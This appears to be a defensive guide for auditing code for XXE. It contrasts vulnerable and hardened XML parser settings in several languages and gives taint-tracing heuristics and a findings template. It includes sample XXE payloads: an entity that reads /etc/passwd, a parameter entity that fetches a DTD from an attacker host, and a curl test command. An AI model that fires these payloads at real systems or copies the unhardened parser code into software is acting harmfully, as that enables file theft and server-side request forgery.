# XXE — Concept, Examples, and Verify Heuristics

## What is XXE

XXE occurs when an XML parser processes a document containing a reference to an external entity and the parser has external entity resolution enabled. An attacker who can supply XML input can use this to read arbitrary local files, perform server-side request forgery (internal network probing), trigger denial-of-service via entity expansion (Billion Laughs), or in some stacks execute OS commands.

The core pattern: *user-controlled XML reaches an XML parser that has not disabled DTD processing or external entity resolution.*

### What XXE IS

- XML parsed with external entity resolution **enabled by default** and no explicit hardening applied
- `SYSTEM` entity declarations that reference `file://` or `http://` URIs: `<!ENTITY xxe SYSTEM "file:///etc/passwd">`
- DTD processing not explicitly disabled in parsers where it is on by default (Java DOM/SAX, PHP SimpleXML/DOMDocument, libxml2-backed parsers)
- Parameter entity injection in DTDs: `<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd"> %xxe;`
- XInclude injection when XInclude processing is enabled
- SSRF via XXE: using `http://` or `https://` external entity URLs to reach internal services
- Blind XXE via out-of-band exfiltration (DNS, HTTP callback to attacker-controlled server)

### What XXE is NOT

Do not flag these as XXE:

- **XSS via XML**: XML data rendered as HTML without escaping — that's XSS
- **SSRF via non-XML**: HTTP requests triggered by other mechanisms — that's SSRF
- **XML parsing of fully server-controlled data**: Config files, bundled resources, migration scripts with no user influence — not exploitable
- **Safe parsers**: Libraries that disable external entities by default and provide no way to re-enable them (e.g. `defusedxml` in Python, `nokogiri` with default settings in Ruby for untrusted input)

### Patterns That Prevent XXE

When you see these patterns, the parser is likely **not vulnerable**:

**1. Disabling DTD / external entities (Java DOM)**
```java
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
dbf.setXIncludeAware(false);
dbf.setExpandEntityReferences(false);
```

**2. Disabling external entities (Java SAX)**
```java
SAXParserFactory spf = SAXParserFactory.newInstance();
spf.setFeature("http://xml.org/sax/features/external-general-entities", false);
spf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
spf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
```

**3. Disabling external entities (Java StAX / XMLInputFactory)**
```java
XMLInputFactory xif = XMLInputFactory.newInstance();
xif.setProperty(XMLInputFactory.IS_SUPPORTING_EXTERNAL_ENTITIES, false);
xif.setProperty(XMLInputFactory.SUPPORT_DTD, false);
```

**4. Python — defusedxml (always safe)**
```python
import defusedxml.ElementTree as ET
tree = ET.parse(source)  # external entities, DTD, entity expansion all blocked
```

**5. Python — lxml with resolve_entities=False**
```python
from lxml import etree
parser = etree.XMLParser(resolve_entities=False, no_network=True)
tree = etree.parse(source, parser)
```

**6. PHP — libxml_disable_entity_loader (PHP < 8.0) / LIBXML_NONET flag**
```php
libxml_disable_entity_loader(true);   // PHP 7.x — disables external entity loading
$doc = new DOMDocument();
$doc->loadXML($xml, LIBXML_NOENT | LIBXML_NONET);  // LIBXML_NONET blocks network
// Note: LIBXML_NOENT alone EXPANDS entities — it does NOT disable them
```

**7. .NET — XmlReaderSettings with DtdProcessing.Prohibit**
```csharp
XmlReaderSettings settings = new XmlReaderSettings();
settings.DtdProcessing = DtdProcessing.Prohibit;
settings.XmlResolver = null;
XmlReader reader = XmlReader.Create(stream, settings);
```

**8. Node.js — xml2js (safe by default in v0.5+)**
```javascript
const xml2js = require('xml2js');
// xml2js does not resolve external entities by default — safe
xml2js.parseString(xmlInput, callback);
```

## Vulnerable vs. Secure Examples

### Python — stdlib xml.etree.ElementTree (vulnerable by default in CPython < 3.8 / expat quirks)

```python
# VULNERABLE: ElementTree parses DTDs; stdlib does NOT protect against all XXE
import xml.etree.ElementTree as ET
def parse_data(request):
    xml_data = request.body
    tree = ET.fromstring(xml_data)   # no hardening — expat may resolve entities
    return process(tree)

# SECURE: use defusedxml drop-in replacement
import defusedxml.ElementTree as ET
def parse_data(request):
    xml_data = request.body
    tree = ET.fromstring(xml_data)   # defusedxml blocks all XXE vectors
    return process(tree)
```

### Python — lxml

```python
# VULNERABLE: lxml resolves external entities by default
from lxml import etree
def parse_upload(request):
    data = request.body
    tree = etree.fromstring(data)    # external entities resolved, network access allowed
    return render(tree)

# SECURE: disable entity resolution and network access
from lxml import etree
def parse_upload(request):
    data = request.body
    parser = etree.XMLParser(resolve_entities=False, no_network=True, load_dtd=False)
    tree = etree.fromstring(data, parser)
    return render(tree)
```

### Java — DocumentBuilder (DOM)

```java
// VULNERABLE: default DocumentBuilder resolves external entities
@PostMapping("/import")
public ResponseEntity<?> importXml(@RequestBody String xml) throws Exception {
    DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
    DocumentBuilder db = dbf.newDocumentBuilder();
    Document doc = db.parse(new InputSource(new StringReader(xml)));
    return ResponseEntity.ok(process(doc));
}

// SECURE: disable DTD and external entity features
@PostMapping("/import")
public ResponseEntity<?> importXml(@RequestBody String xml) throws Exception {
    DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
    dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
    dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
    dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
    dbf.setExpandEntityReferences(false);
    DocumentBuilder db = dbf.newDocumentBuilder();
    Document doc = db.parse(new InputSource(new StringReader(xml)));
    return ResponseEntity.ok(process(doc));
}
```

### Java — SAXParser

```java
// VULNERABLE: default SAXParser allows external entities
SAXParserFactory factory = SAXParserFactory.newInstance();
SAXParser parser = factory.newSAXParser();
parser.parse(inputStream, handler);

// SECURE: disable external entities
SAXParserFactory factory = SAXParserFactory.newInstance();
factory.setFeature("http://xml.org/sax/features/external-general-entities", false);
factory.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
SAXParser parser = factory.newSAXParser();
parser.parse(inputStream, handler);
```

### Java — XMLInputFactory (StAX)

```java
// VULNERABLE: default XMLInputFactory supports external entities
XMLInputFactory xif = XMLInputFactory.newInstance();
XMLStreamReader xsr = xif.createXMLStreamReader(inputStream);

// SECURE: disable external entity support
XMLInputFactory xif = XMLInputFactory.newInstance();
xif.setProperty(XMLInputFactory.IS_SUPPORTING_EXTERNAL_ENTITIES, false);
xif.setProperty(XMLInputFactory.SUPPORT_DTD, false);
XMLStreamReader xsr = xif.createXMLStreamReader(inputStream);
```

### PHP — SimpleXML / DOMDocument

```php
// VULNERABLE: simplexml_load_string with no entity loader disabled
function parseXml($xml) {
    return simplexml_load_string($xml);  // resolves external entities
}

// VULNERABLE: DOMDocument without protection
function parseXml($xml) {
    $doc = new DOMDocument();
    $doc->loadXML($xml);   // external entities enabled by default
    return $doc;
}

// SECURE (PHP 7.x): disable entity loader before parsing
function parseXml($xml) {
    libxml_disable_entity_loader(true);
    $doc = new DOMDocument();
    $doc->loadXML($xml, LIBXML_NONET);
    return $doc;
}
```

### .NET — XmlDocument / XmlTextReader

```csharp
// VULNERABLE: XmlDocument with default XmlUrlResolver resolves external entities
XmlDocument doc = new XmlDocument();
doc.Load(stream);   // external entities resolved

// VULNERABLE: XmlTextReader (legacy) — DTD processing on by default in old .NET
XmlTextReader reader = new XmlTextReader(stream);

// SECURE: XmlDocument with null resolver and prohibited DTD
XmlDocument doc = new XmlDocument();
doc.XmlResolver = null;   // disables external entity resolution
doc.Load(stream);

// SECURE: XmlReader with DtdProcessing.Prohibit
XmlReaderSettings settings = new XmlReaderSettings {
    DtdProcessing = DtdProcessing.Prohibit,
    XmlResolver = null
};
XmlReader reader = XmlReader.Create(stream, settings);
```

### Node.js — libxmljs

```javascript
// VULNERABLE: libxmljs parses with entity resolution on by default
const libxml = require('libxmljs');
app.post('/parse', (req, res) => {
    const doc = libxml.parseXmlString(req.body);
    res.send(doc.toString());
});

// SAFER: no built-in safe flag — avoid libxmljs for untrusted input entirely
// Prefer xml2js or a non-libxml2-backed parser
```

### Ruby — Nokogiri

```ruby
# VULNERABLE: Nokogiri with NOENT option enables entity substitution
def parse_xml(xml_input)
  Nokogiri::XML(xml_input) { |config| config.noent }
end

# SECURE: default Nokogiri (no options) — safe for untrusted input
def parse_xml(xml_input)
  Nokogiri::XML(xml_input)
end
```

### Go — encoding/xml

```go
// VULNERABLE: Go's encoding/xml does not resolve external entities
// but if combined with a third-party parser like etree with network enabled:
import "github.com/beevik/etree"

func parseXML(data []byte) {
    doc := etree.NewDocument()
    doc.ReadFromBytes(data)   // check library's entity resolution behaviour
}

// Go's standard encoding/xml: does not resolve external entities — generally safe.
// Flag only if a third-party XML library with entity support is used.
```

## Verify heuristics (taint analysis)

For each candidate parsing site, determine whether a user-supplied value reaches the XML parser.

User-controlled XML must not reach a parser that allows external entity resolution without hardening. Trace each site's XML input back to its origin.

**For each parsing site, trace the XML input variable(s) backwards to their origin**:

1. **Direct user input** — the XML content is assigned directly from a request source:
   - HTTP request body (especially `Content-Type: application/xml` or `text/xml` endpoints): `request.body`, `req.body`, `request.data`, `php://input`, `HttpContext.Request.Body`
   - File uploads: `request.FILES`, `req.file`, `multipart/form-data` fields
   - HTTP query params or form fields containing XML snippets
   - URL path parameters that reference XML resources

2. **Indirect user input** — the XML is derived from user input through transformations or intermediate steps:
   - A file path supplied by the user is used to open and parse a file
   - A URL supplied by the user is fetched and the response is parsed as XML
   - User input is embedded into an XML template before parsing (potential injection into the XML structure itself)
   - Variable passed through helper functions — trace the full call chain

3. **Second-order input** — the XML content was stored (e.g., in the DB or filesystem) from a prior user-controlled upload or input, and is now being parsed:
   - Find where the stored content was originally written — was it user-supplied at that point?
   - Was it validated or sanitized at write time?

4. **Server-side / hardcoded source** — the XML comes from a bundled resource, config file loaded at startup, or server-generated content with no user influence — this site is NOT exploitable as XXE from user input.

**For each parsing site, also assess exploitability**:
- Is the response returned to the caller? (Reflected XXE — attacker can read file contents directly)
- Is the response not returned, but side effects are observable? (Blind XXE — exfiltration via DNS/HTTP OOB or error messages)
- Is the application behind authentication? (Reduces severity but does not eliminate the vulnerability)
- Is the parser used in a context where only specific XML schemas are accepted? (e.g., SOAP envelope validation — still exploitable if DTD processing is on)

**Confidence selection** (report every parsing site as a `[FINDING]` — do not decide vulnerable/not-vulnerable; Challenge/Trace do):
- **High confidence**: User input demonstrably reaches the XML parser and the parser has no external entity hardening. Response or out-of-band channel allows exfiltration.
- **Medium confidence**: User input probably reaches the parser (indirect flow), or the parser is unhardened but the exploitation path is partially obscured; or you cannot determine the input source with confidence, or the hardening configuration is complex and requires runtime verification.
- **Low confidence**: The XML source is fully server-controlled, OR the parser has proper hardening in place (DTD disabled, external entities disabled) — still record it rather than dropping it; downstream Challenge/Trace decide.

**Findings output** — record each finding as:

```markdown
### [FINDING] Descriptive name (path/to/file.ext:42)
**Confidence:** high
- **File**: `path/to/file.ext` (lines X-Y)
- **Endpoint / function**: [route or function name]
- **Issue**: [e.g., "HTTP request body flows directly into lxml etree.fromstring without resolve_entities=False"]
- **Taint trace**: [Step-by-step from entry point to the parsing call — e.g., "request.body → xml_data → etree.fromstring(xml_data)"]
- **Parser**: [library and version if known]
- **Exploitability**: [Reflected / Blind OOB / DoS only — describe what the attacker can achieve]
- **Impact**: [e.g., "Read arbitrary local files via file:// entity", "SSRF to internal services via http:// entity", "DoS via entity expansion"]
- **Remediation**: [Specific fix — e.g., "Use defusedxml", "Set resolve_entities=False and no_network=True", "Set disallow-doctype-decl feature to true"]
- **Dynamic Test**:
  ```
  [curl command or payload to confirm the finding.
   Show the exact endpoint, Content-Type header, and XXE payload.
   Example:
   curl -X POST https://app.example.com/api/import \
     -H "Content-Type: application/xml" \
     -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>'
   Look for /etc/passwd content in the response body.]
  ```

### [FINDING] Descriptive name (path/to/file.ext:42)
**Confidence:** medium
- **File**: `path/to/file.ext` (lines X-Y)
- **Endpoint / function**: [route or function name]
- **Issue**: [e.g., "XML source likely comes from user-uploaded file via helper function" or "Parser unhardened but input path partially unclear"]
- **Taint trace**: [Best-effort trace with the uncertain step identified]
- **Concern**: [Why it's still a risk despite uncertainty]
- **Remediation**: [Apply appropriate parser hardening]
- **Dynamic Test**:
  ```
  [payload to attempt]
  ```

### [FINDING] Descriptive name (path/to/file.ext:42)
**Confidence:** low
- **File**: `path/to/file.ext` (lines X-Y)
- **Endpoint / function**: [route or function name]
- **Reason**: [e.g., "XML is read from a bundled config file at startup with no user influence" or "defusedxml is used as the parser"]

### [FINDING] Descriptive name (path/to/file.ext:42)
**Confidence:** medium
- **File**: `path/to/file.ext` (lines X-Y)
- **Endpoint / function**: [route or function name]
- **Uncertainty**: [Why the input source or parser configuration could not be determined]
- **Suggestion**: [What to trace manually — e.g., "Follow `load_document()` in xml_utils.py to confirm whether its argument comes from a user request"]
```

**Parser defaults matter**: Java DOM/SAX, PHP SimpleXML/DOMDocument, and lxml all resolve external entities by default — they require explicit hardening. Python's `defusedxml` and Go's `encoding/xml` are safe by default.

**Do not confuse `LIBXML_NOENT` with protection**: in PHP, `LIBXML_NOENT` **expands** entities into their values — it does NOT disable entity loading. Only `libxml_disable_entity_loader(true)` or `LIBXML_NONET` provides network-entity protection.

**XInclude is a separate vector**: if `XIncludeAware` processing is enabled on Java parsers or `xi:include` is processed elsewhere, flag it separately — it can read local files without a classic `ENTITY` declaration.

When in doubt, record it as a `[FINDING]` with `**Confidence:** low` — never drop it; downstream Challenge/Trace decide. False negatives are worse than false positives in security assessment.

Taint can flow indirectly: a file upload may be saved to disk in one handler, then parsed in another background job. Trace the full chain including asynchronous processing paths.

Blind XXE (no output in response) is still exploitable via DNS or HTTP callbacks to attacker-controlled servers. Do not dismiss a finding just because the parsed XML is not echoed back.
